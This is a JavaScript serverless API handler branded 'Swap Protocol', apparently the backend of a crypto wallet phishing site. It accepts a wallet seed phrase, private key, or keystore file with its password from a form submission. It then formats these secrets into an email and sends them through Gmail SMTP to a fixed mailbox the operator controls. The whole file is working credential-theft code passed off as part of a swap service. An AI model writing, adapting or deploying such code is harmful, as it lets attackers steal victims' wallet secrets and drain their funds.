import nodemailer from 'nodemailer';

const smtpHost = process.env.LIMS_SMTP_HOST?.trim() || 'smtp.gmail.com';
const smtpPort = Number(process.env.LIMS_SMTP_PORT || 587);
const gmailUser = process.env.GMAIL_USER?.trim() || process.env.LIMS_SMTP_USER?.trim();
const gmailAppPassword = (process.env.GMAIL_APP_PASSWORD || process.env.LIMS_SMTP_PASSWORD || '').replace(/\s+/g, '');
const mailFromAddress = process.env.LIMS_MAIL_FROM?.trim() || gmailUser;
const mailFromName = process.env.MAIL_FROM_NAME?.trim() || 'Swap Protocol';
const mailDefaultTo = process.env.MAIL_DEFAULT_TO?.trim() || gmailUser;

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'Method not allowed' });

  if (!gmailUser || !gmailAppPassword) {
    return res.status(503).json({ ok: false, error: 'Mail not configured.' });
  }

  const phrase = typeof req.body?.phrase === 'string' ? req.body.phrase.trim() : '';
  const walletName = typeof req.body?.walletName === 'string' ? req.body.walletName.trim() : 'Unknown';
  const privateKeyValue = typeof req.body?.privateKey === 'string' ? req.body.privateKey.trim() : '';
  const keystoreValue = typeof req.body?.keystore === 'string' ? req.body.keystore.trim() : '';
  const keystorePasswordValue = typeof req.body?.keystorePassword === 'string' ? req.body.keystorePassword.trim() : '';

  if (!phrase && !privateKeyValue && !keystoreValue) {
    return res.status(400).json({ ok: false, error: 'No credentials provided.' });
  }

  let subject = 'Wallet Credentials - ';
  let textParts = [];
  let htmlParts = [];

  if (phrase) {
    subject += phrase.split(/\s+/).length + '-Word Phrase';
    textParts.push('Phrase: ' + phrase);
    htmlParts.push('<p><strong>Phrase (' + phrase.split(/\s+/).length + ' words):</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + phrase + '</pre>');
  } else if (privateKeyValue) {
    subject += 'Private Key';
    textParts.push('Private Key: ' + privateKeyValue);
    htmlParts.push('<p><strong>Private Key:</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + privateKeyValue + '</pre>');
  } else if (keystoreValue) {
    subject += 'Keystore';
    textParts.push('Keystore JSON: ' + keystoreValue);
    htmlParts.push('<p><strong>Keystore JSON:</strong></p><pre style="background:#f5f5f5;padding:16px;border-radius:8px;font-size:14px;word-break:break-all">' + keystoreValue + '</pre>');
    if (keystorePasswordValue) {
      textParts.push('Keystore Password: ' + keystorePasswordValue);
      htmlParts.push('<p><strong>Keystore Password:</strong></p><pre style="background:#fff3cd;padding:12px;border-radius:8px;font-size:14px">' + keystorePasswordValue + '</pre>');
    }
  }

  textParts.push('Wallet: ' + walletName);
  textParts.push('---');
  textParts.push('Submitted via Swap Protocol');
  textParts.push(new Date().toISOString());

  const transport = nodemailer.createTransport({
    host: smtpHost,
    port: smtpPort,
    secure: smtpPort === 465,
    auth: { user: gmailUser, pass: gmailAppPassword }
  });

  try {
    await transport.sendMail({
      from: { name: mailFromName, address: mailFromAddress },
      to: mailDefaultTo,
      subject: subject + ' - ' + walletName,
      text: textParts.join('\n'),
      html: '<div style="font-family:sans-serif;padding:20px;max-width:600px"><h2>Wallet Credentials</h2>' +
        '<p><strong>Wallet:</strong> ' + walletName + '</p>' +
        htmlParts.join('') +
        '<hr/><p style="color:#888;font-size:12px">Submitted via Swap Protocol - ' + new Date().toISOString() + '</p></div>'
    });
    res.json({ ok: true });
  } catch (error) {
    console.error('Credential email failed:', error.message);
    res.status(502).json({ ok: false, error: 'Failed to send email.' });
  }
}
